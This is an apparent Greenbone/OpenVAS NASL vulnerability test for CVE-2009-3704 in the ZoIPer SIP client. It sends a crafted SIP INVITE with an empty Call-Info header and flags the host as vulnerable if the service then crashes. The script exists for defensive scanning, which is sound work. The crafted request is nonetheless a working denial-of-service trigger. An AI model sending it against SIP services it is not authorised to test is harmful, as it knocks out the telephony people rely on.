# SPDX-FileCopyrightText: 2009 Greenbone AG
# Some text descriptions might be excerpted from (a) referenced
# source(s), and are Copyright (C) by the respective right holder(s).
#
# SPDX-License-Identifier: GPL-2.0-only

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.800963");
  script_version("2023-07-21T05:05:22+0000");
  script_tag(name:"last_modification", value:"2023-07-21 05:05:22 +0000 (Fri, 21 Jul 2023)");
  script_tag(name:"creation_date", value:"2009-10-23 16:18:41 +0200 (Fri, 23 Oct 2009)");
  script_tag(name:"cvss_base", value:"5.0");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:N/I:N/A:P");
  script_cve_id("CVE-2009-3704");
  script_name("ZoIPer Empty Call-Info Denial of Service Vulnerability");
  script_category(ACT_DENIAL);
  script_copyright("Copyright (C) 2009 Greenbone AG");
  script_family("Denial of Service");
  script_dependencies("sip_detection.nasl", "sip_detection_tcp.nasl");
  script_mandatory_keys("sip/banner/available");

  script_xref(name:"URL", value:"http://secunia.com/advisories/37015");
  script_xref(name:"URL", value:"http://xforce.iss.net/xforce/xfdb/53792");
  script_xref(name:"URL", value:"http://packetstormsecurity.org/0910-exploits/zoiper_dos.py.txt");

  script_tag(name:"impact", value:"Successful exploitation will allow attackers to cause the service to crash.");

  script_tag(name:"affected", value:"ZoIPer version prior to 2.24 (Windows) and 2.13 (Linux).");

  script_tag(name:"insight", value:"The flaw is due to an error while handling specially crafted SIP INVITE
  messages which contain an empty Call-Info header.");

  script_tag(name:"solution", value:"Upgrade to ZoIPer version 2.24 (Windows) and 2.13 (Linux) or later.");

  script_tag(name:"summary", value:"ZoIPer is prone to a denial of service (DoS) vulnerability.");

  script_tag(name:"solution_type", value:"VendorFix");
  script_tag(name:"qod_type", value:"remote_analysis");

  exit(0);
}

include("sip.inc");
include("misc_func.inc");
include("port_service_func.inc");

infos = sip_get_port_proto( default_port:"5060", default_proto:"udp" );
port = infos["port"];
proto = infos["proto"];

banner = sip_get_banner( port:port, proto:proto );
if( !banner || "Zoiper" >!< banner ) exit( 0 );

if( ! sip_alive( port:port, proto:proto ) ) exit( 0 );

vt_strings = get_vt_strings();
from_default = vt_strings["default"];
from_lower   = vt_strings["lowercase"];

req = string(
  "INVITE sip:", from_lower, "@", get_host_name(), " SIP/2.0","\r\n",
  "Via: SIP/2.0/", toupper( proto ), " ", this_host(), ":", port, ";branch=z9hG4bKJRnTggvMGl-6233","\r\n",
  "Max-Forwards: 70","\r\n",
  "From: ", from_default, " <sip:", from_lower, "@", this_host(),">;tag=f7mXZqgqZy-6233","\r\n",
  "To: ", from_default, " <sip:", from_lower, "@", get_host_name(), ":", port, ">","\r\n",
  "Call-ID: ", rand(),"\r\n",
  "CSeq: 6233 INVITE","\r\n",
  "Contact: ", from_default, " <sip:", from_lower, "@", get_host_name(),">","\r\n",
  "Content-Type: application/sdp","\r\n",
  "Call-Info:","\r\n",
  "Content-Length: 125","\r\n\r\n");
sip_send_recv( port:port, data:req, proto:proto );

if( ! sip_alive( port:port, proto:proto ) ) {
  security_message( port:port, proto:proto );
  exit( 0 );
}

exit( 99 );
